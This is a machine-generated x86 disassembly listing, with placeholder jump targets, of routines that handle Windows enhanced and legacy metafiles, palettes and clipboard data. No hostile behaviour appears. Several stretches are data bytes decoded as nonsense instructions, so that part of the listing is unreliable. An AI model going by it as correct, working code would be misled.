mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov edx [ eax ]
call [ edx + 0x20 ]
test eax eax
jne r-xdata
push 0x8
mov eax [ ebp - 0xc ]
push eax
call GetDeviceCaps
push eax
push 0x4
mov eax [ ebp - 0xc ]
push eax
call GetDeviceCaps
imul eax eax 0x64
push eax
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0x58 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x2c ]
push eax
call MulDiv
mov edx eax
mov eax edi
call sub_424470
push 0x4
mov eax [ ebp - 0xc ]
push eax
call GetDeviceCaps
imul edx eax 0x64
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_424470
jmp r-xdata
push ebx
push r-xdata
push esi
push r-xdata
lea eax [ ebp - 0x20 ]
mov edx 0x4
call sub_4043b8
mov eax [ ebp - 0x20 ]
call sub_4044f8
jmp r-xdata
mov eax esi
call sub_4042f8
test eax eax
jle r-xdata
push 0xa
mov eax [ ebp - 0xc ]
push eax
call GetDeviceCaps
push eax
push 0x6
mov eax [ ebp - 0xc ]
push eax
call GetDeviceCaps
imul eax eax 0x64
push eax
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0x58 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
call MulDiv
mov edx eax
mov eax edi
call sub_424434
push 0x6
mov eax [ ebp - 0xc ]
push eax
call GetDeviceCaps
imul edx eax 0x64
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_424434
jmp r-xdata
push eax
lea eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
call CreateEnhMetaFileA
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4214ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423a52
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
call sub_4217bc
retn
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
sub_423a6f
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_423aa3
inc [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
call sub_403674
mov ebx edx
mov edi eax
mov eax edi
call sub_42146c
mov esi eax
xor edx edx
mov eax edi
call sub_4214ec
push esi
call CloseEnhMetaFile
mov edx eax
mov eax [ edi + 0x58 ]
call sub_424330
mov edx ebx
and dl 0xfc
mov eax edi
call sub_420e4c
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40365c
sub_423af8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4229e4
mov [ esi + 0x2c ] 0x1
mov [ esi + 0x21 ] 0x1
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_423b40
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_424cec
mov edx ebx
and dl 0xfc
mov eax esi
call sub_417ae8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_423b70
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor edi edi
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
test esi esi
je r-xdata
mov edi [ eax + 0x14 ]
call sub_424cec
mov edx esi
mov eax ebx
call sub_417b14
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ ebx + 0x28 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
mov edx [ eax + 0x28 ]
mov [ ebx + 0x28 ] edx
mov al [ eax + 0x2c ]
mov [ ebx + 0x2c ] al
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x28 ]
call sub_424ce8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
cmp edi eax
je r-xdata
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov al 0x1
pop edi
pop esi
pop ebx
retn
sub_423c04
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
mov esi eax
xor ebp ebp
test esi esi
je r-xdata
mov eax [ esp ]
push esi
push edi
mov esi eax
lea edi [ esp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
dec [ esp + 0xc ]
dec [ esp + 0x10 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
mov eax edi
call sub_42146c
push eax
call PlayEnhMetaFile
test esi esi
je r-xdata
push 0xffffffff
push esi
mov eax edi
call sub_42146c
push eax
call SelectPalette
mov ebp eax
mov eax edi
call sub_42146c
push eax
call RealizePalette
push 0xffffffff
push ebp
mov eax edi
call sub_42146c
push eax
call SelectPalette
sub_423c94
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
call sub_404038
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileDescriptionA
mov edi eax
test edi edi
jle r-xdata
mov eax esi
mov edx edi
call sub_404684
mov eax [ esi ]
call sub_4044f8
push eax
push edi
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileDescriptionA
mov eax [ esi ]
call sub_4044f8
call sub_408824
mov edx eax
mov eax esi
call sub_404684
sub_423cfc
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax ebx
call sub_404038
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileDescriptionA
mov edi eax
test edi edi
jle r-xdata
mov eax ebx
mov edx edi
call sub_404684
mov eax [ ebx ]
call sub_4044f8
push eax
push edi
mov eax [ esi + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileDescriptionA
mov eax [ ebx ]
call sub_4044f8
call sub_408824
mov ecx eax
inc ecx
mov eax ebx
mov edx 0x1
call sub_404598
mov eax [ ebx ]
call sub_4044f8
call sub_408824
mov edx eax
mov eax ebx
call sub_404684
sub_423d94
push ebx
add esp 0xffffff9c
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov ebx [ ebx + 0x28 ]
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_423f6c
push 0x9ec
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call MulDiv
mov eax [ ebx + 0x8 ]
test eax eax
jne r-xdata
push esp
push 0x64
push eax
call GetEnhMetaFileHeader
imul eax [ esp + 0x54 ] 0x64
push eax
mov eax [ esp + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call MulDiv
jmp r-xdata
mov eax [ ebx + 0x20 ]
jmp r-xdata
add esp 0x64
pop ebx
retn
sub_423e28
push ebx
push esi
push edi
add esp 0xfffffbfc
mov ebx eax
xor edi edi
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
mov eax edi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x8 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
mov edi [ eax + 0x14 ]
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFilePaletteEntries
mov esi eax
test esi esi
je r-xdata
cmp esi 0x100
jle r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41f6dc
mov [ esp ] 0x300
mov [ esp + 0x2 ] si
lea eax [ esp + 0x4 ]
push eax
push esi
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFilePaletteEntries
mov eax esp
push eax
call CreatePalette
mov edx [ ebx + 0x28 ]
mov [ edx + 0x14 ] eax
and esi 0xff
sub_423eb4
push ebx
add esp 0xffffff9c
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov ebx [ ebx + 0x28 ]
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_423f6c
push 0x9ec
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0xc ]
push eax
call MulDiv
mov eax [ ebx + 0x8 ]
test eax eax
jne r-xdata
push esp
push 0x64
push eax
call GetEnhMetaFileHeader
imul eax [ esp + 0x50 ] 0x64
push eax
mov eax [ esp + 0x4c ]
push eax
mov eax [ ebx + 0xc ]
push eax
call MulDiv
jmp r-xdata
mov eax [ ebx + 0x1c ]
jmp r-xdata
add esp 0x64
pop ebx
retn
sub_423f18
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_424524
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_4192e8
pop ecx
sub ecx eax
mov edx esi
mov eax ebx
call sub_4240d0
mov edx esi
mov eax ebx
call sub_424000
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
retn
sub_423f6c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x28 ]
call sub_424cec
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov esi eax
mov [ ebx + 0x28 ] esi
mov eax esi
call sub_424ce8
pop esi
pop ebx
retn
sub_423f94
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
cmp [ esp ] 0x4
jg r-xdata
mov edx esi
mov eax ebx
call sub_424524
test al al
je r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
mov ecx [ esp ]
sub ecx 0x4
mov edx esi
mov eax ebx
call sub_4240d0
mov edx esi
mov eax ebx
call sub_424000
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edx
pop edi
pop esi
pop ebx
retn
sub_424000
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_423f6c
lea edx [ ebp - 0x68 ]
mov ecx 0x64
mov eax edi
call sub_419514
cmp [ ebp - 0x40 ] 0x464d4520
je r-xdata
mov eax [ ebp - 0x38 ]
call sub_40276c
mov [ ebp - 0x4 ] eax
mov ebx [ esi + 0x28 ]
xor eax eax
push ebp
push sub_4240c0
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x68 ]
mov ecx 0x64
call sub_402968
mov ecx [ ebp - 0x38 ]
sub ecx 0x64
mov edx [ ebp - 0x4 ]
add edx 0x64
mov eax edi
call sub_419514
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
call SetEnhMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
call sub_42175c
mov [ ebx + 0x18 ] 0x0
mov eax [ ebp - 0x48 ]
sub eax [ ebp - 0x50 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x44 ]
sub eax [ ebp - 0x4c ]
mov [ ebx + 0x10 ] eax
mov [ esi + 0x2c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4240c7
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_40278c
retn
call sub_42175c
sub_4240d0
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_423f6c
lea edx [ ebp - 0x22 ]
mov ecx 0x16
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x22 ] 0x9ac6cdd7
jne r-xdata
call sub_42175c
lea eax [ ebp - 0x22 ]
call sub_4225ac
cmp ax [ ebp - 0xe ]
je r-xdata
movzx eax [ ebp - 0x14 ]
push eax
push 0x9ec
movsx eax [ ebp - 0x18 ]
movsx edx [ ebp - 0x1c ]
sub eax edx
push eax
call MulDiv
mov [ ebx + 0xc ] eax
movzx eax [ ebp - 0x14 ]
push eax
push 0x9ec
movsx eax [ ebp - 0x16 ]
movsx edx [ ebp - 0x1a ]
sub eax edx
push eax
call MulDiv
mov [ ebx + 0x10 ] eax
mov [ ebp - 0x32 ] 0x8
xor eax eax
mov [ ebp - 0x2e ] eax
xor eax eax
mov [ ebp - 0x2a ] eax
xor eax eax
mov [ ebp - 0x26 ] eax
lea eax [ ebp - 0x32 ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SetWinMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
mov [ ebp - 0x14 ] 0x60
sub [ ebp - 0x8 ] 0x16
mov eax [ ebp - 0x8 ]
call sub_40276c
mov [ ebp - 0xc ] eax
mov ebx [ esi + 0x28 ]
xor eax eax
push ebp
push sub_42423f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ esi + 0x28 ]
mov dx [ ebp - 0x14 ]
mov [ eax + 0x18 ] dx
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
lea eax [ ebp - 0x96 ]
push eax
push 0x64
mov eax [ ebx + 0x8 ]
push eax
call GetEnhMetaFileHeader
mov [ ebp - 0x32 ] 0x8
mov eax [ ebp - 0x76 ]
mov [ ebp - 0x2e ] eax
mov eax [ ebp - 0x72 ]
mov [ ebp - 0x2a ] eax
xor eax eax
mov [ ebp - 0x26 ] eax
mov eax [ ebx + 0x8 ]
push eax
call DeleteEnhMetaFile
lea eax [ ebp - 0x32 ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SetWinMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
call sub_42175c
mov [ esi + 0x2c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424246
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_40278c
retn
call sub_42175c
sub_424250
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4242f7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x2c ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_4242d5
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_40872c
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_40c4bc
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404444
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_422cb0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4242dc
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x2c ] dl
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2c ] 0x0
sub_424330
push ebx
push esi
add esp 0xffffff9c
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov eax ebx
call sub_424584
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
push esp
push 0x64
push esi
call GetEnhMetaFileHeader
test eax eax
jne r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41f6dc
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x14 ] edx
mov [ eax + 0x8 ] esi
xor edx edx
mov [ eax + 0x1c ] edx
xor edx edx
mov [ eax + 0x20 ] edx
test esi esi
je r-xdata
push eax
call DeleteEnhMetaFile
call sub_42175c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
add esp 0x64
pop esi
pop ebx
retn
mov edx [ esp + 0x20 ]
sub edx [ esp + 0x18 ]
mov [ eax + 0xc ] edx
mov edx [ esp + 0x24 ]
sub edx [ esp + 0x1c ]
mov [ eax + 0x10 ] edx
sub_4243c0
push ebx
push esi
add esp 0xffffff9c
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_423f6c
mov eax [ rw-data ]
push eax
push 0x9ec
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_424434
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
push esp
push 0x64
push edx
call GetEnhMetaFileHeader
mov eax [ esp + 0x4c ]
push eax
imul eax [ esp + 0x58 ] 0x64
push eax
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_424434
jmp r-xdata
mov [ eax + 0x20 ] esi
jmp r-xdata
add esp 0x64
pop esi
pop ebx
retn
sub_424434
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x20 ] edx
cmp esi [ eax + 0x10 ]
je r-xdata
mov eax ebx
call sub_423f6c
pop esi
pop ebx
retn
mov eax ebx
call sub_424584
mov eax [ ebx + 0x28 ]
mov [ eax + 0x10 ] esi
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_424470
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x1c ] edx
cmp esi [ eax + 0xc ]
je r-xdata
mov eax ebx
call sub_423f6c
pop esi
pop ebx
retn
mov eax ebx
call sub_424584
mov eax [ ebx + 0x28 ]
mov [ eax + 0xc ] esi
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4244b0
push ebx
push esi
add esp 0xffffff9c
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_423f6c
mov eax [ rw-data ]
push eax
push 0x9ec
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_424470
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
push esp
push 0x64
push edx
call GetEnhMetaFileHeader
mov eax [ esp + 0x48 ]
push eax
imul eax [ esp + 0x54 ] 0x64
push eax
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_424470
jmp r-xdata
mov [ eax + 0x1c ] esi
jmp r-xdata
add esp 0x64
pop esi
pop ebx
retn
sub_424524
push ebx
push esi
push edi
add esp 0xffffff9c
mov ebx edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_4192e8
sub esi eax
cmp esi 0x64
jle r-xdata
cmp esi 0x64
jle r-xdata
mov edx esp
mov ecx 0x64
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov cx 0x1
mov edx 0xffffff9c
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
xor eax eax
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
add esp 0x64
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x28 ] 0x464d4520
je r-xdata
mov al 0x1
sub_424584
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x28 ]
test eax eax
jne r-xdata
cmp [ eax + 0x4 ] 0x1
jle r-xdata
mov eax ebx
call sub_423f6c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov esi eax
mov eax [ ebx + 0x28 ]
mov edi [ eax + 0x8 ]
test edi edi
je r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x10 ] eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
mov [ esi + 0xc ] eax
mov eax [ ebx + 0x28 ]
mov ax [ eax + 0x18 ]
mov [ esi + 0x18 ] ax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x1c ]
mov [ esi + 0x1c ] eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x20 ]
mov [ esi + 0x20 ] eax
mov eax [ ebx + 0x28 ]
call sub_424cec
mov eax esi
mov [ ebx + 0x28 ] eax
call sub_424ce8
push 0x0
push edi
call CopyEnhMetaFileA
mov [ esi + 0x8 ] eax
sub_424608
push ebx
push esi
push edi
push ecx
mov ebx edx
mov esi eax
cmp [ esi + 0x28 ] 0x0
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
mov edx esp
mov ecx 0x4
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax ebx
call sub_4192e8
sub eax 0x4
mov [ esp ] eax
cmp [ esi + 0x2c ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_424714
mov edx ebx
mov eax esi
call sub_424688
jmp r-xdata
xor ecx ecx
mov edx [ esp ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub eax [ esp ]
mov [ esp ] eax
mov edx esp
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_424688
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileBits
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_40276c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_424704
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileBits
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_41954c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40278c
retn
sub_424714
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x22 ]
xor ecx ecx
mov edx 0x16
call sub_402cfc
mov ebx [ ebx + 0x28 ]
mov [ ebp - 0x22 ] 0x9ac6cdd7
mov ax [ ebx + 0x18 ]
test ax ax
jne r-xdata
mov [ ebp - 0x14 ] ax
mov [ ebp - 0x14 ] 0x60
jmp r-xdata
lea edx [ ebp - 0x22 ]
mov ecx 0x16
mov eax esi
call sub_41954c
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_41954c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424836
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40278c
retn
call sub_4217bc
push 0x9ec
movzx eax [ ebp - 0x14 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call MulDiv
mov [ ebp - 0x18 ] ax
push 0x9ec
movzx eax [ ebp - 0x14 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call MulDiv
mov [ ebp - 0x16 ] ax
lea eax [ ebp - 0x22 ]
call sub_4225ac
mov [ ebp - 0xe ] ax
push 0x0
call GetDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_42484f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push 0x8
push 0x0
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call GetWinMetaFileBits
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_40276c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42482f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push 0x8
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
push eax
call GetWinMetaFileBits
cmp eax [ ebp - 0x8 ]
jae r-xdata
sub_42485c
push ebp
mov ebp esp
add esp 0xffffff9c
push ebx
push esi
push edi
mov ebx eax
push 0xe
call GetClipboardData
mov edi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_423f6c
mov esi [ ebx + 0x28 ]
push 0x0
push edi
call CopyEnhMetaFileA
mov [ esi + 0x8 ] eax
lea eax [ ebp - 0x64 ]
push eax
push 0x64
mov eax [ esi + 0x8 ]
push eax
call GetEnhMetaFileHeader
mov eax [ ebp - 0x44 ]
sub eax [ ebp - 0x4c ]
mov [ esi + 0xc ] eax
mov eax [ ebp - 0x40 ]
sub eax [ ebp - 0x48 ]
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x0
mov [ ebx + 0x2c ] 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ rw-data ]
call sub_42172c
sub_4248e0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov esi [ ebx + 0x28 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov [ edx ] 0xe
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
push 0x0
mov eax [ esi + 0x8 ]
push eax
call CopyEnhMetaFileA
mov [ edi ] eax
sub_424934
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0x49
inc edx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
add [ eax ] al
jl r-xdata
hlt
jo r-xdata
popad
add [ ebx + edi * 2 ] dl
inc ecx
add al cl
adc eax 0x15b40042
inc edx
add ah bh
dec ebx
inc edx
add [ 0x74694254 ] cl
insd
popad
jo r-xdata
pop ecx
pop ecx
mov [ fs : eax ] edx
imul esp [ ebx + 0x73 ] 0x8b550000
in al dx
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_4178dc
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_424a6a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
rcl [ ebp + 0x68 ] 0x6a
dec edx
inc edx
add [ edi + edi * 8 + 0x30 ] ah
popad
outsb
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424a71
mov eax [ rw-data ]
call sub_417940
retn
mov [ ebp - 0x4 ] eax
call sub_417570
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_421308
test al al
je r-xdata
jae r-xdata
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_424a42
push [ fs : eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ecx * 2 + 0x640042 ] dl
add [ eax ] al
pushfd
out dx al
inc ecx
